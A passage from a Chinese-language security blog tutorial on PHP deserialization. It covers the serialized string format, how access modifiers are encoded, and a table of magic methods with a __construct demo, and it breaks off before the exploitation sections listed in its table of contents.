<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="pop入门"><title>php反序列化\pop</title><link rel=canonical href=https://baozongwi.xyz/p/php-deserialization-pop/><link rel=stylesheet href=/scss/style.min.9e8b18c747f57ad90de96f4d19b7a6f65ecd340a2e5b106e957cbecbd4b12b78.css><meta property='og:title' content="php反序列化\\pop"><meta property='og:description' content="pop入门"><meta property='og:url' content='https://baozongwi.xyz/p/php-deserialization-pop/'><meta property='og:site_name' content="baozongwi's blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='姿势'><meta property='article:tag' content='php'><meta property='article:published_time' content='2024-09-07T11:03:57+00:00'><meta property='article:modified_time' content='2024-09-07T11:03:57+00:00'><meta name=twitter:title content="php反序列化\\pop"><meta name=twitter:description content="pop入门"><link rel="shortcut icon" href=/logo.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/acvtar_hu_773da4d2b586f7f.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>baozongwi's blog</a></h1><h2 class=site-description>H@cking Th3 Fu1ure</h2></div></header><ol class=menu-social><li><a href=mailto:baozongwi@qq.com target=_blank title=Email rel=me><svg viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><rect x="3" y="5" width="18" height="14" rx="2"/><path d="M3 7l9 6 9-6"/></svg></a></li><li><a href=/index.xml target=_blank title=RSS rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=https://github.com/baozongwi target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li><a href=https://www.yuque.com/baozongwi/kkn04k><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-map-pin"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0118 0z"/><circle cx="12" cy="10" r="3"/></svg>
<span>travel</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#概念>概念</a></li><li><a href=#格式>格式</a></li><li><a href=#访问控制修饰符>访问控制修饰符</a><ol><li><a href=#public>public</a></li><li><a href=#protected>protected</a></li><li><a href=#private>private</a></li><li><a href=#demo>demo</a></li></ol></li><li><a href=#魔术方法>魔术方法</a><ol><li><a href=#construct>construct</a></li><li><a href=#destruct>destruct</a></li><li><a href=#tostring>toString</a></li><li><a href=#wakeup>wakeup</a></li><li><a href=#sleep>sleep</a></li><li><a href=#call>call</a></li><li><a href=#callstatic>callStatic</a></li><li><a href=#get>get</a></li><li><a href=#set>set</a></li><li><a href=#isset>isset</a></li><li><a href=#unset>unset</a></li><li><a href=#invoke>invoke</a></li></ol></li><li><a href=#wakeup-bypass>wakeup bypass</a><ol><li><a href=#cve-2016-7124>CVE-2016-7124</a></li><li><a href=#使用c打头绕过>使用C打头绕过</a></li><li><a href=#引用地址>引用地址</a></li><li><a href=#fast-destruct>fast-destruct</a></li><li><a href=#php-issue9618>php issue#9618</a></li></ol></li><li><a href=#bypass-tips>bypass tips</a><ol><li><a href=#追加任意字符串>追加任意字符串</a></li><li><a href=#长度前面添加0>长度前面添加0</a></li><li><a href=#s数据类型的字符串hex编码>S数据类型的字符串Hex编码</a></li><li><a href=#任意两个字符替换o之后的>任意两个字符替换O之后的<code>:{</code></a></li><li><a href=#数字前面添加>数字前面添加<code>+</code></a></li></ol></li><li><a href=#字符串逃逸>字符串逃逸</a><ol><li><a href=#字符增多>字符增多</a></li><li><a href=#字符减少>字符减少</a></li></ol></li><li><a href=#pop链子>pop链子</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/talk/>Talk</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/php-deserialization-pop/>php反序列化\pop</a></h2><h3 class=article-subtitle>pop入门</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Sep 07, 2024</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>12 minute read</time></div></footer></div></header><section class=article-content><h1 id=0x01-前言>0x01 前言</h1><p>总感觉自己的<code>php</code>反序列化不够稳定，简单的那确实直接就秒了，稍微来点东西就卡着，所以我觉得还是很有必要来深入浅出一下</p><h1 id=0x02-question>0x02 question</h1><h2 id=概念>概念</h2><p>什么是序列化?</p><p><code>serialize()</code>：将变量序列化为字符串。</p><p>什么是反序列化?</p><p><code>unserialize()</code>：将序列化后的字符串恢复为PHP的变量</p><p>那么明明知道有危险为什么还会这样子呢，序列化的好处</p><blockquote><p>可以利用相对来说极小的空间存储信息，方便进行二次利用</p></blockquote><h2 id=格式>格式</h2><p><code>php</code>序列化的存储格式是<code>json</code>,我们来理解一下这个字符串的格式</p><p>首先利用<code>serialize</code>生成一个字符串</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Me</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$name</span><span class=o>=</span><span class=s2>&#34;bao&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$age</span><span class=o>=</span><span class=s2>&#34;18&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$languages</span><span class=o>=</span><span class=s2>&#34;CN&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>serialize</span><span class=p>(</span><span class=k>new</span> <span class=nx>Me</span><span class=p>());</span>
</span></span><span class=line><span class=cl><span class=o>/*</span>
</span></span><span class=line><span class=cl><span class=nx>O</span><span class=o>:</span><span class=mi>2</span><span class=o>:</span><span class=s2>&#34;Me&#34;</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;name&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;bao&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;age&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>2</span><span class=o>:</span><span class=s2>&#34;18&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>9</span><span class=o>:</span><span class=s2>&#34;languages&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>2</span><span class=o>:</span><span class=s2>&#34;CN&#34;</span><span class=p>;}</span>
</span></span></code></pre></td></tr></table></div></div><p>一般的序列化字符串的格式是</p><blockquote><p>变量类型:类名长度:类名:属性数量:{属性类型:属性名长度:属性名;属性值类型:属性值长度:属性值内容}</p></blockquote><p>其中常见的类型标志如下</p><div class=table-wrapper><table><thead><tr><th>符号</th><th>类型描述</th></tr></thead><tbody><tr><td>a</td><td>array 数组型</td></tr><tr><td>b</td><td>boolean 布尔型</td></tr><tr><td>d</td><td>double 浮点型</td></tr><tr><td>i</td><td>integer 整数型</td></tr><tr><td>o</td><td>common object 共同对象</td></tr><tr><td>r</td><td>object reference 对象引用</td></tr><tr><td>s</td><td>non-escaped binary string 非转义的二进制字符串</td></tr><tr><td>S</td><td>escaped binary string 转义的二进制字符串</td></tr><tr><td>C</td><td>custom object 自定义对象</td></tr><tr><td>O</td><td>class 对象</td></tr><tr><td>N</td><td>null 空</td></tr><tr><td>R</td><td>pointer reference 指针引用</td></tr><tr><td>U</td><td>unicode string Unicode 编码的字符串</td></tr></tbody></table></div><p>那么我们随手写的第一个序列化字符串就是</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>O</span><span class=o>:</span><span class=mi>2</span><span class=o>:</span><span class=s2>&#34;Me&#34;</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;name&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;bao&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;age&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>2</span><span class=o>:</span><span class=s2>&#34;18&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>9</span><span class=o>:</span><span class=s2>&#34;languages&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>2</span><span class=o>:</span><span class=s2>&#34;CN&#34;</span><span class=p>;}</span>
</span></span></code></pre></td></tr></table></div></div><ul><li><code>O:2:"Me"</code>表示这个是一个对象且类名为<code>Me</code>,</li><li><code>3</code>表示该类有三个属性</li><li><code>s:4:"name";s:3:"bao";</code>表示第一个属性为字符串，且属性名为<code>name</code>,属性值为字符串,属性内容为<code>bao</code></li></ul><p>同理下面的不讲了</p><p>那么我们如果得到一个序列化字符串如何快速的得到原来的内容呢，这就是反序列化了！</p><p>还是以我们自己写的为例子</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$data</span><span class=o>=</span><span class=s1>&#39;O:2:&#34;Me&#34;:3:{s:4:&#34;name&#34;;s:3:&#34;bao&#34;;s:3:&#34;age&#34;;s:2:&#34;18&#34;;s:9:&#34;languages&#34;;s:2:&#34;CN&#34;;}&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>var_dump</span><span class=p>(</span><span class=nx>unserialize</span><span class=p>(</span><span class=nv>$data</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=o>/*</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>__PHP_Incomplete_Class</span><span class=c1>#1 (4) {
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=k>public</span> <span class=nv>$__PHP_Incomplete_Class_Name</span> <span class=o>=&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nx>string</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span> <span class=s2>&#34;Me&#34;</span>
</span></span><span class=line><span class=cl>  <span class=k>public</span> <span class=nv>$name</span> <span class=o>=&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nx>string</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span> <span class=s2>&#34;bao&#34;</span>
</span></span><span class=line><span class=cl>  <span class=k>public</span> <span class=nv>$age</span> <span class=o>=&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nx>string</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span> <span class=s2>&#34;18&#34;</span>
</span></span><span class=line><span class=cl>  <span class=k>public</span> <span class=nv>$languages</span> <span class=o>=&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nx>string</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span> <span class=s2>&#34;CN&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>那么我们就得到了这个字符串是如何序列化而来，并且也确实像前面说的一样起到了存储数据的功能</p><h2 id=访问控制修饰符>访问控制修饰符</h2><blockquote><p>public(公有属性)</p><p>protected(受保护的)</p><p>private(私有的)</p></blockquote><p>那么这么几个字那肯定是不能理解的我们深入一下，但是在**php7.1+**的时候就不敏感了</p><h3 id=public>public</h3><ul><li>公有属性可以在类的任何地方访问，序列化时也会直接包含在序列化字符串中，反序列化时能够正常恢复。</li><li>这是最普通的属性，可在序列化和反序列化之间正常传递。</li></ul><p>就是说这个相当于是直接把门给你了，有钥匙就行</p><h3 id=protected>protected</h3><ul><li>受保护的属性只能在类内部及其子类中访问。</li><li>在反序列化时，PHP会恢复这些属性，但是只能在类或其子类中访问</li></ul><h3 id=private>private</h3><ul><li>私有属性只能在定义它的类内部访问。</li></ul><h3 id=demo>demo</h3><p>那么写个<code>demo</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Me</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$name</span><span class=o>=</span><span class=s2>&#34;bao&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>protected</span> <span class=nv>$age</span><span class=o>=</span><span class=s2>&#34;18&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$languages</span><span class=o>=</span><span class=s2>&#34;CN&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$object</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Me</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$data</span> <span class=o>=</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$object</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$data</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>file_put_contents</span><span class=p>(</span><span class=s2>&#34;serialize.txt&#34;</span><span class=p>,</span> <span class=nv>$data</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>生成的文件拖到010里面或者在Linux里面进行16进制解析</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>hexdump -C serialize.txt
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/php-deserialization-pop/QQ20240908-110903.png width=1185 height=426 srcset="/p/php-deserialization-pop/QQ20240908-110903_hu_720e9e219271600b.png 480w, /p/php-deserialization-pop/QQ20240908-110903_hu_71be335c0268eaf7.png 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=278 data-flex-basis=667px></p><p>诶这就是控制修饰符的特殊之处了，我们得到的序列化字符串是这样的</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>O:2:&#34;Me&#34;:3:{s:4:&#34;name&#34;;s:3:&#34;bao&#34;;s:6:&#34;*age&#34;;s:2:&#34;18&#34;;s:13:&#34;Melanguages&#34;;s:2:&#34;CN&#34;;}
</span></span></code></pre></td></tr></table></div></div><p>这样子看可能还是不太好看，我们再选中看看那两个空白符是干哈的</p><p><img src=/p/php-deserialization-pop/QQ20240908-111849.png width=1170 height=351 srcset="/p/php-deserialization-pop/QQ20240908-111849_hu_94312b4e49bb1a68.png 480w, /p/php-deserialization-pop/QQ20240908-111849_hu_a31cc72f3a2cec6b.png 1024w" loading=lazy alt=2 class=gallery-image data-flex-grow=333 data-flex-basis=800px></p><p>也就是<code>protected</code>的属性名长度和属性名都发生了改变构造为</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>public:
</span></span><span class=line><span class=cl>s:3:&#34;age&#34;;s:2:&#34;18&#34;;
</span></span><span class=line><span class=cl>protected:
</span></span><span class=line><span class=cl>s:6:&#34;%00*%00age&#34;;s:2:&#34;18&#34;;
</span></span></code></pre></td></tr></table></div></div><p>反观<code>private</code>,也有改变</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>public:
</span></span><span class=line><span class=cl>s:9:&#34;languages&#34;;s:2:&#34;CN&#34;;
</span></span><span class=line><span class=cl>private:
</span></span><span class=line><span class=cl>s:13:&#34;%00Me%00languages&#34;;s:2:&#34;CN&#34;;
</span></span></code></pre></td></tr></table></div></div><p>总结一下也就是</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>public</span><span class=p>(</span><span class=nx>公有</span><span class=p>)</span> 
</span></span><span class=line><span class=cl><span class=k>protected</span><span class=p>(</span><span class=nx>受保护</span><span class=p>)</span>     <span class=c1>// %00*%00属性名
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>private</span><span class=p>(</span><span class=nx>私有的</span><span class=p>)</span>       <span class=c1>// %00类名%00属性名
</span></span></span></code></pre></td></tr></table></div></div><h2 id=魔术方法>魔术方法</h2><div class=table-wrapper><table><thead><tr><th style=text-align:left>函数</th><th style=text-align:left>说明</th></tr></thead><tbody><tr><td style=text-align:left>__construct()</td><td style=text-align:left>构造函数，当一个对象创建时被调用。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作</td></tr><tr><td style=text-align:left>__destruct()</td><td style=text-align:left>析构函数，当一个对象销毁时被调用。会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行</td></tr><tr><td style=text-align:left>__toString</td><td style=text-align:left>当一个对象被当作一个字符串被调用，把类当作字符串使用时触发，返回值需要为字符串</td></tr><tr><td style=text-align:left>__wakeup()</td><td style=text-align:left>调用unserialize()时触发，反序列化恢复对象之前调用该方法，例如重新建立数据库连接，或执行其它初始化操作。unserialize()会检查是否存在一个__wakeup()方法。如果存在，则会先调用__wakeup()，预先准备对象需要的资源。</td></tr><tr><td style=text-align:left>__sleep()</td><td style=text-align:left>调用serialize()时触发 ，在对象被序列化前自动调用，常用于提交未提交的数据，或类似的清理操作。同时，如果有一些很大的对象，但不需要全部保存，这个功能就很好用。serialize()函数会检查类中是否存在一个魔术方法__sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个E_NOTICE级别的错误</td></tr><tr><td style=text-align:left>__call()</td><td style=text-align:left>在对象上下文中调用不可访问的方法时触发，即当调用对象中不存在的方法会自动调用该方法</td></tr><tr><td style=text-align:left>__callStatic()</td><td style=text-align:left>在静态上下文中调用不可访问的方法时触发</td></tr><tr><td style=text-align:left>__get()</td><td style=text-align:left>用于从不可访问的属性读取数据，即在调用私有属性的时候会自动执行</td></tr><tr><td style=text-align:left>__set()</td><td style=text-align:left>用于将数据写入不可访问的属性</td></tr><tr><td style=text-align:left>__isset()</td><td style=text-align:left>在不可访问的属性上调用isset()或empty()触发</td></tr><tr><td style=text-align:left>__unset()</td><td style=text-align:left>在不可访问的属性上使用unset()时触发</td></tr><tr><td style=text-align:left>__invoke()</td><td style=text-align:left>当脚本尝试将对象调用为函数时触发</td></tr></tbody></table></div><p>这些是常见的魔术方法，接下来进行逐个测试</p><h3 id=construct>construct</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Demo</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$name</span><span class=o>=</span><span class=s2>&#34;wi&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$age</span><span class=o>=</span><span class=mi>19</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>name</span><span class=o>=</span><span class=s2>&#34;bao&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>age</span><span class=o>=</span><span class=mi>18</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;construct被调用</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>Demo</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=o>/*</span>
</span></span><span class=line><span class=cl><span class=nx>construct被调用</span>
</span></span><span class=line><span class=cl><span class=nx>O</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;Demo&#34;</span><span class=o>:</span><span class=mi>2</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;name&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;bao&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;age&#34;</span><span class=p>;</span><span class=nx>i</span><span class=o>:</span><span class=mi>18</span><span class=p>;}</span>
